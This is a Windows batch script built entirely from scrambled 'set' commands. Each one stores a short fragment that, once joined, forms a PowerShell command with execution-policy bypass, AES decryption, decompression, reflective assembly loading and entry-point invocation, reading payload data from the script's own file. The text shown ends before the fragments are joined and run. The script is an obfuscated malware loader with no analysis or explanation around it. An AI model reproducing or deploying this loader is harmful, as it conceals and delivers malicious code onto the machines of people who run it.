@echo off
set "imhDYEVnnF=embl"
set "zcHyNOlnmt=CFxo"
set "uwHttfUKuN='')("
set "nYYNTvPLTE=;$ux"
set "qtSvvJcdyi=null"
set "UvktoIlukE=eMVs"
set "qzVJuRLGyN=y.Pa"
set "OdqOuiIhPQ=$Ofm"
set "qzvhBRqHQF=Z = "
set "RajKVnesEG=mory"
set "SSKPifySWw=mpdc"
set "pOblGgbjdH=orF'"
set "vcStoiHIZj=UdZ."
set "AIblLDZEJK=GcPi"
set "xaHVEzPZij=ct S"
set "FkamVgMAMX=lit("
set "HASXkfDxog=);$V"
set "PCBzTHRQwN=Np ="
set "pocghsOGXs= [st"
set "hUyyuPyQDc=('da"
set "aWwGqooYNl=-nop"
set "SXfVSeTPzl= = $"
set "wraubKBoyv=GFSq"
set "eiYVbstjmC=.Cry"
set "ppEqPbDgrD=OxSg"
set "FYRPbMHBis=rity"
set "NVbbwIKgtC=gth)"
set "qOphyKaiVV=ptog"
set "kjxzgKRQmc=dM.D"
set "ILhPKRRmAC=y.Cr"
set "MGCTlkViJu=uYDn"
set "knIwFYUZsg=uYDn"
set "uvdbjImNeH=m.Re"
set "lRhbMseDhi=FSqS"
set "ujokSCUqrX=hy.A"
set "JQrXTSlBgx= [Sy"
set "DSzoDEAKZT=pose"
set "zKVFlxJDEC=$Vsm"
set "dMpTBGmiWO=m.IO"
set "MdQKTXJRXg=comp"
set "qjnoTMjKRe=mpdc"
set "VbvKQHCgSg=..-1"
set "nbgcPaLYfs=.Sec"
set "PWakQvZbuQ=qS);"
set "PjSWtwvjAJ=);$M"
set "xAngnNHhVz=($Gc"
set "iPpWdqUwRa=);$M"
set "ZqpHhbVZeW=3); "
set "kuEsEEXNPZ=nirt"
set "jFSHzTvtph=)) {"
set "WsUNpVAeYl=saBm"
set "bkaxRmxrcS=M = "
set "IlpalbDhxO=rtS4"
set "RCJijxMVWj=i.En"
set "hPwRAQSoxi=Fina"
set "KvGApseASe=L4Yi"
set "IcoqPVyFfY=bypa"
set "LNnvQMYVHF=pher"
set "WpJoqudhDy=YDUd"
set "rVKIkBfowR=vert"
set "aNGTazHgFT=, $G"
set "AHycaGESTW=]::("
set "DRSwdKkILJ=m.IO"
set "SbKcSJGiKA=ionM"
set "icQfpecnOO=]::N"
set "GfVSljQqJA=s75K"
set "tSPgRxYBdq=File"
set "JoctKDNtjv=Mode"
set "uZwrwMWEVr=le  "
set "ZtKiRNlvKf=PKCS"
set "HlfjUxbsgF=join"
set "dMUOmHNPwD= [Sy"
set "DmrRagCqpG=)($G"
set "JfYjTgCmOu=lBlo"
set "WUoiFnaShM=[Sys"
set "nVQENiAiwP=dc.I"
set "hwmapungBP=dj0C"
set "qcEhvpZCzv=.Con"
set "IthTnHnXmG=lln."
set "qaJBsukxtE=ct S"
set "EaebRUrSsF=tem."
set "WnPHpDQpEJ=stem"
set "nlYzTnpspC=($Gc"
set "TypcZGESMp=iron"
set "nKHfqUQOCI=n ''"
set "fXZdWRVmXT=$Mmp"
set "jbWhdizZmq=RmAx"
set "ZtTPQxRQfk=Comp"
set "UGEVvmAAGa=();$"
set "OBCvlxMuHZ=[Env"
set "gMDUdMehnH= = ["
set "bGDDUbDjoA=New-"
set "IhZpijNlax=ptor"
set "LdLBbBbFNI= if "
set "tTlimpFOiL=ose("
set "eIlZwVSSto=$uxM"
set "hIYBcBQKhZ=.Dis"
set "rxuVmRSIWc=7;$M"
set "yZaVSnBBTz= New"
set "bSYlsMfkPV=Uvi "
set "vXroFHFYsJ=Invo"
set "dSRSlCavoZ=form"
set "lDaeCoOvha=pres"
set "pEYWgYZSqv=gO ="
set "lInyJgkvYZ=grap"
set "hRfQTthmZJ=pose"
set "AwUtZwMoti=Vn.T"
set "ySvCcvCTgU=FSqS"
set "cVfWbnOIij=-4] "
set "kwaWuoNXAl=oArr"
set "DajtgpPfEe=Disp"
set "jggjjypVhs=$Ofm"
set "ROcviiSZBt=Pio."
set "IYkFeiEiiS=ose("
set "MUFzBYCXft='txe"
set "hcAMGijlPw=ment"
set "cMymOLeoqT=::De"
set "GPqYYNuSpY=zuZI"
set "CloMopjAdN=rity"
set "ZYCpLYadbo=tem."
set "HKThVOyrLz=rofi"
set "DqWRqgaWLI=MVn "
set "MajvMULCdX=Conv"
set "ToxZXsypuo=]::C"
set "jyyDGFeryf=esMa"
set "iPiYuDqtjC===')"
set "JzKZBIhtbo=; };"
set "DqdYsGxKlz=ach "
set "FhTiYKHfMO=:('g"
set "LrvWRualkj== [S"
set "ycocgympES='[-1"
set "ZIiqlHEbhw=ck($"
set "YzvhfvFgNb=[IO."
set "DGLDXBVBby=zHhH"
set "xgSMqbeVTW=ring"
set "nBFlRQIjNU=fore"
set "yyKiDYtdJd=GFSq"
set "yhVkWsGHZA=ert]"
set "PhxgNniFlU==');"
set "umDQAzQpQo=$Ofm"
set "gxkrpGWEug=Vsmd"
set "PnLneUviYv=;$YD"
set "GsFLEqndug=);$O"
set "SRbWGmeTHK=eam("
set "LuRKlBVnIA=oryS"
set "qcHZcaiMsX='gni"
set "xBSNiJEChP=6esa"
set "qNGkNrRrwH=g = "
set "pEbUTkaMfV=gsYZ"
set "rlnchEAGQH=$YDU"
set "zRHhyGlETs=ode]"
set "DuHACSUmxl=ateD"
set "yMksLlQOfj=in $"
set "knRYYcoqgl= '')"
set "sIuDGrXfFK=oin "
set "djXLPzswqv=oint"
set "KQxavvIJuM=am;$"
set "lGIbdWGtQt=t Sy"
set "BmGbcAMkrm=pStr"
set "KTMeSByEUO=join"
set "CUNxQMaQPc=ne);"
set "hPUeafAzcK=l5E7"
set "nqyXijzAuT=$OxS"
set "AziRMKFgJk=ecry"
set "dJbWSWrqRV=daeR"
set "TqARBMZoIJ=MVn."
set "wGFDnBCLVW=16] "
set "yWDYJvpecV= = $"
set "UvgfKfDytZ=)))"
set "tEyLZcSIHF=1] -"
set "liLdsrcazb=flec"
set "eqFBVUjhfA=ke($"
set "WnJQWazRUp=6] -"
set "pPmsfIGVyJ=ptog"
set "dAvELFyeMm=raph"
set "UrbUvrlqzP=.Cry"
set "zmeJVLmlzM=-1.."
set "uFpNwShQAz=Obje"
set "HgoqtgCFer=em.I"
set "cTXTPfCJjS=.Mod"
set "LeBzFkzFlc=ypto"
set "lvkJaqvlWW=, (,"
set "yYlikcqMoc=('%*'"
set "UiInmllSAO=yTo("
set "ZghOXfXAXg=Secu"
set "jhsZMRPgWM=ion."
set "sKcwZtlInh=comm"
set "jbNYPazfjE=ss -"
set "gfcyKGasdB=  $N"
set "XcVLssOyvZ=.Key"
set "XyddISfMqm=ress"
set "CxPjnweUfz=tS46"
set "clefRYHCmX=..-1"
set "RYGERsYpzI=mpdc"
set "IZGOLuSxlv=S46e"
set "ZueMpHVpCb== $M"
set "BSrvMnvBri=ect "
set "JLxYfWbqtS=th('"
set "JxHdCFNQpl=mpdc"
set "EXqXYQhlNF=y.Ci"
set "HCwgDqVXnu=Mmpd"
set "IKJKvCPIHd=tryP"
set "GZJEBehqLF=Np.T"
set "OFuPhFAexE=[-1."
set "tkyKCUDDdd=('%~f0'"
set "AYfZlbWkKc=rans"
set "NSBnveFtDT=-joi"
set "SkTqRSAQdJ=.-16"
set "AlZxtrsBZe=ay()"
set "IyWrwzTrUy=;$uW"
set "aYsIfbcNXc=tsWi"
set "SoBfWyhmyH=trea"
set "MjAWmFHFjF=O.Me"
set "hklwaZsNqN=V = "
set "BpTkQrTsxW=O) {"
set "IwxJYdmpzU=mpdc"
set "eqQmRsLgCB=and "
set "MGrGWMAJAU=yste"
set "zCVvDjjJRD=S = "
set "MzGmNrhnZu=gMod"
set "kydAzRTGNG=e]::"
set "VZpPZVRlpg=New-"
set "psDIrclfnQ=stem"
set "hyOYmdHRWC=brea"
set "EnNslqVHXm=.Len"
set "dxveyOjTQt=1..-"
set "DSYdYNXjep=k; }"
set "mwJUAqouMj=.Ass"
set "YXuXDWbpFd=]::("
set "dvIFjsBLOa=;$ux"
set "RYhwspYETx=Comp"
set "GlwKJjahlC=$GFS"
set "rjYkdtdurX=('Tg"
set "YQbfRWWvbB=o.Su"
set "PNJwPbbtKo=[Sys"
set "nNABEVmvPl=;$Ci"
set "SqBkQOaYbS=bjec"
